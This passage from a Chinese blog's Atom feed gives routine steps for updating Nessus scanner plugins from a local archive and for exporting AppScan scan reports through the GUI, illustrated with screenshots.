&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;du -h /opt/nessus/lib/nessus/plugins&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/fyfile/1762/1646044171048/e89f232f79234dfabfe2419db15ac273.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;正常情况下，该目录应该在 1.4G 左右。如远远低于此数值。请按如下步骤操作：&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;service nessusd stop;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;/opt/nessus/sbin/nessuscli update ./all-2.0.tar.gz&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sh qd_nessus.sh&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;然后打开浏览器，正常访问 nessus。（&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9saW5rcy5qaWFuc2h1LmNvbS9nbz90bz1odHRwcyUzQSUyRiUyRmNlbnRvcw==&#34;&gt;https://&lt;/span&gt;ip:8843）静待 plugins 更新完成。&lt;/p&gt;
</content>
        <updated>2023-01-10T21:37:04.000Z</updated>
    </entry>
    <entry>
        <id>https://mangpumo.github.io/2023/01/11/AppScan%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A/</id>
        <title>AppScan扫描报告</title>
        <link rel="alternate" href="https://mangpumo.github.io/2023/01/11/AppScan%E6%89%AB%E6%8F%8F%E6%8A%A5%E5%91%8A/"/>
        <content type="html">&lt;h1 id=&#34;appscan扫描报告&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#appscan扫描报告&#34;&gt;#&lt;/a&gt; AppScan 扫描报告&lt;/h1&gt;
&lt;h2 id=&#34;1加载扫描结果&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#1加载扫描结果&#34;&gt;#&lt;/a&gt; 1. 加载扫描结果&lt;/h2&gt;
&lt;p&gt;1. 点击【打开】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/6113b3be3e3f4823b6e8a3299a4168b2.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 选择之前保存过的扫描结果&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5a5205ed79b54851b4d2ab9b00e3b94e.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 等待加载完成&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4cdd51d08f5c48188c7a4c76a2a1af52.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;2领导查看的报告&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#2领导查看的报告&#34;&gt;#&lt;/a&gt; 2. 领导查看的报告&lt;/h2&gt;
&lt;p&gt;1. 点击【报告】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/147bde4944b941558a599f08ff29cdde.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 模板选择为【缺省值】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fda3f723caab4dabb81cee31211c0197.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 最低严重性选择为【中】，测试类型选择为【应用程序】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/9c78640cace24a498a841f9cb43410bd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;4. 点击【布局】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/e41b7307149b430eb2606f0cee651a84.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;5. 选择【其他徽标】，点击上传徽标&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/df41332deeca4243bd9a9f2b098c50e3.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;6. 选择徽标，点击打开&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/58c0f0878dd4457bbf97c1ca6fbfae45.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;7. 修改报告标题，比如输入 【哔哩嘀哩网站安全评估报告】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/c9709b41eff441cab81b66b982fa958a.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;8. 点击【保存报告】&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4a4c6ce4f8b44483be607691b1ca8dc1.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;9. 选择喜欢的位置保存&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/59d25ea09c1b46169c0a3a6258711bbd.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/2de43fdea3194cd5ac62997e1dc5edaf.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/f0c77212eb8e4e828585f795344b6ab9.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/fa4e3bd17c6743f994862de41f0e87eb.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;3其他报告&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#3其他报告&#34;&gt;#&lt;/a&gt; 3. 其他报告&lt;/h2&gt;
&lt;p&gt;1. 行业标准报告&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/5c7340c0a26f498cbcf4a9feb30a8b65.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;2. 合规一致性报告&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/4812c10f2bd445d6ac3d63e3caae12f8.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
&lt;p&gt;3. 基于模板报告&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://fynotefile.oss-cn-zhangjiakou.aliyuncs.com/fynote/1762/1640841025000/d7bbb31bea304c5086c93f66a8e4bbda.png&#34; alt=&#34;image.png&#34;&gt;&lt;/p&gt;
</content>
        <updated>2023-01-10T21:35:41.000Z</updated>
    </entry>
</feed>
